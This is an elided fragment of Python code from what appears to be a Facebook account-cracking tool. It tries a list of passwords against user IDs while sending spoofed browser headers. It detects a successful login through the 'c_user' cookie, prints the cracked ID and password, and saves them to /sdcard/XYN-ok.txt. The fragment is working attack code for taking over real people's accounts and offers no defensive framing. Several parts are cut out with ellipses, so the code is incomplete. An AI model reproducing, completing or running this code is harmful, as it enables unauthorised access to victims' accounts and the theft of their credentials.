...
def test(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            'dpr': '3',
            'referer': 'https://m.facebook.com/bookmarks/?paipv=0&eav=AfaNImMa51erS_bh7y4Tk4pWdahMRppkRLP9Ct8YG9PPARyAF5IbT7U5GDFNiaqAlR8',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="123", "Microsoft Edge";v="121"',
            'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="123.0.6263.221", "Microsoft Edge";v="121.0.2282.89"',
            'sec-ch-ua-mobile': '?0',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m[XYN-OK] '+cid+' ¤ '+ps+'\33[0;92m')
                oks.append(cid)
                open('/sdcard/XYN-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
